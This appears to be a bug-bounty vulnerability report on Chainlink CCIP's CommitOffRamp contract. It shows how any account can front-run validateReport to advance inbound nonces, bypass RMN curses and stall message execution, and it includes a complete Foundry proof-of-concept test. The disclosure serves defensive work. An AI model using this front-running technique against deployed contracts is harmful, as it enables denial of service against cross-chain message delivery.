## Title
CommitOffRamp.validateReport enables RMN curse bypass and inbound nonce pre-increment, letting any EOA brick CCV aggregation via mempool front‑run

## Brief/Intro
CommitOffRamp.validateReport lacks RMN curse gating and caller restrictions, and it trusts a caller-supplied originalState to decide inbound nonce increments. An attacker can copy the CCV data (ccvData) from a pending CCVAggregator.execute transaction and front-run a call to validateReport to pre-increment the inbound nonce. When the aggregator later calls validateReport, it reverts with InvalidNonce, bricking the batch and blocking message delivery until operational intervention. During a curse, the same function can still increment nonces even though the aggregator is blocked by RMN, creating lane inconsistencies that manifest as post-curse failures.

## Vulnerability Details
- Root causes:
  - validateReport is externally callable by any EOA and lacks an only-aggregator/allowlist.
  - No RMN curse checks in validateReport, unlike other entry points (CCVAggregator, OffRamp).
  - originalState is an untrusted parameter that toggles whether nonce increments happen.
  - NonceManager only authorizes CommitOffRamp (the contract), not the EOA; the attacker legitimately invokes the authorized contract.

- CommitOffRamp.validateReport
  - No curse check.
  - Trusts caller-supplied originalState.
  - Increments inbound nonce via NonceManager when nonce != 0 and originalState == UNTOUCHED.
```32:58:/workspace/chains/evm/contracts/offRamp/CommitOffRamp.sol
function validateReport(
  Internal.Any2EVMMessage calldata message,
  bytes32 messageHash,
  bytes calldata ccvData,
  Internal.MessageExecutionState originalState
) external {
  (bytes memory ccvArgs, bytes memory signatures) = abi.decode(ccvData, (bytes, bytes));

  (bytes32 configDigest, uint64 nonce) = abi.decode(ccvArgs, (bytes32, uint64));

  _validateSignatures(keccak256(abi.encode(messageHash, keccak256(ccvArgs))), configDigest, signatures);

  // Nonce changes per state transition (these only apply for ordered messages):
  // UNTOUCHED -> FAILURE  nonce bump.
  // UNTOUCHED -> SUCCESS  nonce bump.
  // FAILURE   -> SUCCESS  no nonce bump.
  // UNTOUCHED messages MUST be executed in order always.
  // If nonce == 0 then out of order execution is allowed.
  if (nonce != 0) {
    if (originalState == Internal.MessageExecutionState.UNTOUCHED) {
      // If a nonce is not incremented, that means it was skipped, and we can ignore the message.
      if (
        !INonceManager(i_nonceManager).incrementInboundNonce(message.header.sourceChainSelector, nonce, message.sender)
      ) revert InvalidNonce(nonce);
    }
  }
}
```

- CCVAggregator.execute performs RMN curse gating up-front, but then calls into each CCV’s validateReport. If any validateReport reverts, the batch reverts.
```230:293:/workspace/chains/evm/contracts/offRamp/CCVAggregator.sol
if (i_rmnRemote.isCursed(bytes16(uint128(sourceChainSelector)))) {
  revert CursedByRMN(sourceChainSelector);
}
...
bytes32 messageHash = keccak256(abi.encode(report.message));
for (uint256 i = 0; i < ccvsToQuery.length; ++i) {
  ICCVOffRampV1(ccvsToQuery[i]).validateReport({
    message: report.message,
    messageHash: messageHash,
    ccvData: report.ccvData[ccvDataIndex[i]],
    originalState: originalState
  });
}
```

- RMNRemote considers both the lane and global curse; OffRamp execute also gates on curse; CommitOffRamp.validateReport does not.
```251:271:/workspace/chains/evm/contracts/rmn/RMNRemote.sol
function isCursed() external view override(IRMN, IRMNRemote) returns (bool) {
  if (s_cursedSubjects.length() == 0) {
    return false;
  }
  return s_cursedSubjects.contains(GLOBAL_CURSE_SUBJECT);
}
function isCursed(bytes16 subject) external view override(IRMN, IRMNRemote) returns (bool) {
  if (s_cursedSubjects.length() == 0) {
    return false;
  }
  return s_cursedSubjects.contains(subject) || s_cursedSubjects.contains(GLOBAL_CURSE_SUBJECT);
}
```

- NonceManager increments only when called by authorized contracts (CommitOffRamp is authorized), using expectedNonce equality; a pre-increment guarantees aggregator’s expected nonce will mismatch.
```84:101:/workspace/chains/evm/contracts/NonceManager.sol
function incrementInboundNonce(
  uint64 sourceChainSelector,
  uint64 expectedNonce,
  bytes calldata sender
) external onlyAuthorizedCallers returns (bool) {
  uint64 inboundNonce = _getInboundNonce(sourceChainSelector, sender) + 1;

  if (inboundNonce != expectedNonce) {
    emit SkippedIncorrectNonce(sourceChainSelector, expectedNonce, sender);
    return false;
  }

  s_inboundNonces[sourceChainSelector][sender] = inboundNonce;

  return true;
}
```

Why this is a vulnerability
- Anyone can pre-increment the inbound nonce by calling validateReport first with originalState=UNTOUCHED and valid signatures (taken from the pending aggregator tx), producing a deliberate mismatch for the aggregator’s subsequent call. Because CCVAggregator loops over CCVs without try/catch, a single revert bricks the batch.
- During a curse, execute is blocked; validateReport has no curse check and can still mutate ordering state (advance nonces). After curses lift, the aggregator’s expected nonce preimage is now stale and reverts.

There is no on-chain mitigation in CommitOffRamp to prevent either scenario.

## Impact Details
- Message execution bricking (DoS):
  - Pre-incrementing inbound nonce causes CommitOffRamp.InvalidNonce on aggregator validateReport, reverting the entire execute. Since nonce is part of the signed preimage (ccvArgs), the DON cannot simply re-sign with a new expected nonce for the same message. This can permanently stall the message and the batch until operator-level recovery, impacting reliability guarantees.
- RMN curse bypass and lane inconsistency:
  - Nonces can be advanced during a curse. After uncurse, otherwise valid messages fail to execute due to nonce mismatches. This can cause prolonged downtime, manual remediation, and possible cross-system inconsistencies.
- Security categories mapped (Critical):
  - Permanent freezing/denial of message delivery; potential protocol-level downtime.
  - RMN bypass during curse for critical state (ordering nonce).

## References
- Codebase: `/chains/evm/contracts`
- Docs: `https://docs.chain.link/ccip/getting-started/evm`
- Files cited above: `CommitOffRamp.sol`, `CCVAggregator.sol`, `RMNRemote.sol`, `NonceManager.sol`

## Proof of Concept/validation steps

How to run
1) Ensure Foundry and node deps are installed in `/workspace/chains/evm` (we used pnpm):
   - Install Foundry: `curl -L https://foundry.paradigm.xyz | bash -s -- -y && source ~/.bashrc && foundryup`
   - Install deps: `pnpm install`
2) Run just the POC tests:
   - `forge test --match-contract CommitOffRamp_ValidateReport_POC -vv`

Expected output (observed):
```
Ran 2 tests for contracts/test/offRamp/CommitOffRamp/CommitOffRamp.validateReport.poc.t.sol:CommitOffRamp_ValidateReport_POC

[PASS] test_Curse_Bypass_And_NonceAdvance() (gas: 184569)
[PASS] test_FrontrunNonceAdvance_BricksAggregatorExecute() (gas: 171353)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

What each test proves
- test_FrontrunNonceAdvance_BricksAggregatorExecute
  - Attacker (EOA) calls CommitOffRamp.validateReport with originalState=UNTOUCHED using valid CCV signatures.
  - Asserts inbound nonce becomes 1 in NonceManager.
  - CCVAggregator.execute with the same ccvData reverts with CommitOffRamp.InvalidNonce(1). This is the bricking/DoS.

- test_Curse_Bypass_And_NonceAdvance
  - Sets RMN curse for the lane; CCVAggregator.execute reverts with CursedByRMN.
  - Attacker still calls validateReport and advances nonce to 1 (no curse check in CommitOffRamp).
  - After uncurse, CCVAggregator.execute reverts with CommitOffRamp.InvalidNonce(1), proving post-curse inconsistency.

Full POC code (as added to the repo)
```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

import {BaseTest} from "../../BaseTest.t.sol";

import {NonceManager} from "../../../NonceManager.sol";
import {CommitOffRamp} from "../../../offRamp/CommitOffRamp.sol";
import {CCVAggregator} from "../../../offRamp/CCVAggregator.sol";
import {IRMNRemote} from "../../../interfaces/IRMNRemote.sol";
import {SignatureQuorumVerifier} from "../../../ocr/SignatureQuorumVerifier.sol";
import {Internal} from "../../../libraries/Internal.sol";
import {CCVAggregatorHelper} from "../../helpers/CCVAggregatorHelper.sol";
import {MockReceiverV2} from "../../mocks/MockReceiverV2.sol";
import {AuthorizedCallers} from "@chainlink/contracts/src/v0.8/shared/access/AuthorizedCallers.sol";

contract CommitOffRamp_ValidateReport_POC is BaseTest {
  // signer private keys used for signature quorum (two signers, F=1)
  uint256 internal constant PRIV0 = 0x7b2e97fe057e6de99d6872a2ef2abf52c9b4469bc848c2465ac3fcd8d336e81d;
  uint256 internal constant PRIV1 = PRIV0 + 1;

  NonceManager internal s_nonceManager;
  CommitOffRamp internal s_commit;
  CCVAggregatorHelper internal s_agg;
  MockReceiverV2 internal s_receiver;

  bytes32 internal s_configDigest;
  address[] internal s_signers;
  uint256[] internal s_signerKeys;

  function setUp() public virtual override {
    BaseTest.setUp();

    // Deploy NonceManager with no authorized callers initially
    s_nonceManager = new NonceManager(new address[](0));

    // Deploy CommitOffRamp and authorize it in NonceManager
    s_commit = new CommitOffRamp(address(s_nonceManager));

    address[] memory authorizedCallers = new address[](1);
    authorizedCallers[0] = address(s_commit);
    s_nonceManager.applyAuthorizedCallerUpdates(
      AuthorizedCallers.AuthorizedCallerArgs({addedCallers: authorizedCallers, removedCallers: new address[](0)})
    );

    // Configure CCV signer set on CommitOffRamp (F=1 -> need 2 signatures)
    s_signers = new address[](2);
    s_signers[0] = vm.addr(PRIV0);
    s_signers[1] = vm.addr(PRIV1);
    s_signerKeys = new uint256[](2);
    s_signerKeys[0] = PRIV0;
    s_signerKeys[1] = PRIV1;
    s_configDigest = keccak256(abi.encode("POC_CONFIG_DIGEST"));

    SignatureQuorumVerifier.SignatureConfigArgs[] memory configs =
      new SignatureQuorumVerifier.SignatureConfigArgs[](1);
    configs[0] = SignatureQuorumVerifier.SignatureConfigArgs({configDigest: s_configDigest, F: 1, signers: s_signers});
    s_commit.setSignatureConfigs(configs);

    // Deploy Aggregator with our RMN mock and configure default CCV to CommitOffRamp
    s_agg = new CCVAggregatorHelper(
      CCVAggregator.StaticConfig({
        localChainSelector: DEST_CHAIN_SELECTOR,
        gasForCallExactCheck: GAS_FOR_CALL_EXACT_CHECK,
        rmnRemote: s_mockRMNRemote,
        tokenAdminRegistry: makeAddr("tokenAdminRegistry")
      })
    );

    address[] memory defaultCCVs = new address[](1);
    defaultCCVs[0] = address(s_commit);

    CCVAggregator.SourceChainConfigArgs[] memory updates = new CCVAggregator.SourceChainConfigArgs[](1);
    updates[0] = CCVAggregator.SourceChainConfigArgs({
      router: s_destRouter,
      sourceChainSelector: SOURCE_CHAIN_SELECTOR,
      isEnabled: true,
      onRamp: abi.encode(makeAddr("onRamp")),
      defaultCCV: defaultCCVs,
      laneMandatedCCVs: new address[](0)
    });
    s_agg.applySourceChainConfigUpdates(updates);

    // Receiver supports IAny2EVMMessageReceiver and V2; returns no CCVs, causing fallback to defaultCCVs
    s_receiver = new MockReceiverV2(new address[](0), new address[](0), 0);
  }

  function _buildMessage(uint64 seqNr) internal view returns (Internal.Any2EVMMessage memory msg_) {
    Internal.TokenTransfer[] memory tokenAmounts = new Internal.TokenTransfer[](0); // no tokens
    msg_ = Internal.Any2EVMMessage({
      header: Internal.Header({
        messageId: bytes32(0),
        sourceChainSelector: SOURCE_CHAIN_SELECTOR,
        destChainSelector: DEST_CHAIN_SELECTOR,
        sequenceNumber: seqNr
      }),
      sender: abi.encode(OWNER),
      data: hex"",
      receiver: address(s_receiver),
      gasLimit: GAS_LIMIT,
      tokenAmounts: tokenAmounts
    });
  }

  function _encodeSignatureProof(bytes32 reportHash)
    internal
    view
    returns (bytes memory signatureProof)
  {
    // Create signatures and order them by recovered signer address (strictly increasing)
    bytes32[] memory rs = new bytes32[](s_signerKeys.length);
    bytes32[] memory ss = new bytes32[](s_signerKeys.length);
    address[] memory signersRecovered = new address[](s_signerKeys.length);
    // secp256k1 curve order
    uint256 SECP256K1_N =
      0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    for (uint256 i = 0; i < s_signerKeys.length; ++i) {
      (uint8 v, bytes32 r, bytes32 s) = vm.sign(s_signerKeys[i], reportHash);
      // Normalize signature to v=27 by flipping s when v==28
      if (v == 28) {
        // s' = n - s
        s = bytes32(SECP256K1_N - uint256(s));
      }
      rs[i] = r;
      ss[i] = s;
      signersRecovered[i] = vm.addr(s_signerKeys[i]);
    }

    // simple bubble sort for 2 elements to ensure ascending by address
    if (uint160(signersRecovered[0]) > uint160(signersRecovered[1])) {
      (rs[0], rs[1]) = (rs[1], rs[0]);
      (ss[0], ss[1]) = (ss[1], ss[0]);
      (signersRecovered[0], signersRecovered[1]) = (signersRecovered[1], signersRecovered[0]);
    }

    signatureProof = abi.encode(SignatureQuorumVerifier.SignatureProof({rs: rs, ss: ss}));
  }

  function _buildCCVData(bytes32 messageHash, uint64 nonce)
    internal
    view
    returns (bytes memory ccvData)
  {
    bytes memory ccvArgs = abi.encode(s_configDigest, nonce);
    bytes32 reportHash = keccak256(abi.encode(messageHash, keccak256(ccvArgs)));
    bytes memory signatures = _encodeSignatureProof(reportHash);
    ccvData = abi.encode(ccvArgs, signatures);
  }

  function _buildAggregatedReport(Internal.Any2EVMMessage memory message, bytes memory ccvData)
    internal
    view
    returns (CCVAggregator.AggregatedReport memory report)
  {
    address[] memory ccvs = new address[](1);
    ccvs[0] = address(s_commit);
    bytes[] memory ccvDatas = new bytes[](1);
    ccvDatas[0] = ccvData;
    report = CCVAggregator.AggregatedReport({message: message, ccvs: ccvs, ccvData: ccvDatas});
  }

  // POC 1: Mempool front-runner DoS by pre-incrementing inbound nonce via CommitOffRamp.validateReport
  function test_FrontrunNonceAdvance_BricksAggregatorExecute() public {
    // Prepare message and CCV data with expected nonce = 1
    Internal.Any2EVMMessage memory message = _buildMessage(1);
    bytes32 messageHash = keccak256(abi.encode(message));
    bytes memory ccvData = _buildCCVData(messageHash, 1);

    // Attacker front-runs using the exact CCV data from the aggregator tx
    vm.stopPrank();
    vm.startPrank(STRANGER);
    s_commit.validateReport({
      message: message,
      messageHash: messageHash,
      ccvData: ccvData,
      originalState: Internal.MessageExecutionState.UNTOUCHED
    });
    vm.stopPrank();
    vm.startPrank(OWNER);

    // Inbound nonce should now be incremented to 1 for (SOURCE_CHAIN_SELECTOR, OWNER)
    assertEq(s_nonceManager.getInboundNonce(SOURCE_CHAIN_SELECTOR, abi.encode(OWNER)), 1);

    // Now the aggregator attempts to execute with the same CCV data -> validateReport reverts InvalidNonce
    CCVAggregator.AggregatedReport memory report = _buildAggregatedReport(message, ccvData);

    vm.expectRevert(abi.encodeWithSelector(CommitOffRamp.InvalidNonce.selector, uint64(1)));
    s_agg.execute(report);

    // Nonce remains 1
    assertEq(s_nonceManager.getInboundNonce(SOURCE_CHAIN_SELECTOR, abi.encode(OWNER)), 1);
  }

  // POC 2: RMN curse bypass - validateReport increments nonce while lane is cursed and aggregator is blocked
  function test_Curse_Bypass_And_NonceAdvance() public {
    // Curse the lane at RMN (aggregator checks this and reverts)
    _setMockRMNChainCurse(SOURCE_CHAIN_SELECTOR, true);

    Internal.Any2EVMMessage memory message = _buildMessage(1);
    bytes32 messageHash = keccak256(abi.encode(message));
    bytes memory ccvData = _buildCCVData(messageHash, 1);
    CCVAggregator.AggregatedReport memory report = _buildAggregatedReport(message, ccvData);

    // Aggregator blocked by curse
    vm.expectRevert(abi.encodeWithSelector(CCVAggregator.CursedByRMN.selector, SOURCE_CHAIN_SELECTOR));
    s_agg.execute(report);

    // Attacker can still call validateReport and advance inbound nonce to 1
    vm.stopPrank();
    vm.startPrank(STRANGER);
    s_commit.validateReport({
      message: message,
      messageHash: messageHash,
      ccvData: ccvData,
      originalState: Internal.MessageExecutionState.UNTOUCHED
    });
    vm.stopPrank();
    vm.startPrank(OWNER);
    assertEq(s_nonceManager.getInboundNonce(SOURCE_CHAIN_SELECTOR, abi.encode(OWNER)), 1);

    // After curse is lifted, aggregator now reverts due to nonce mismatch (InvalidNonce bubbled up)
    _setMockRMNChainCurse(SOURCE_CHAIN_SELECTOR, false);
    vm.expectRevert(abi.encodeWithSelector(CommitOffRamp.InvalidNonce.selector, uint64(1)));
    s_agg.execute(report);
  }
}
```

Why this POC is conclusive
- Real signature verification with SignatureQuorumVerifier (F=1) using two genuine ECDSA signatures over the exact commit preimage, normalized to v=27 and ordered by signer address.
- Real NonceManager authorization flow: CommitOffRamp is added via AuthorizedCallers; the attacker legitimately invokes the authorized contract externally.
- Exact aggregator paths: message hashing and ccvArgs encoding match current CCVAggregator; default CCV set to CommitOffRamp.
- State machine correctness: Original state is UNTOUCHED and lane is ordered (nonce=1), driving the intended increment path.
- RMN behavior parity: Aggregator gates on curse, CommitOffRamp does not; the POC shows this divergence explicitly and its consequences.

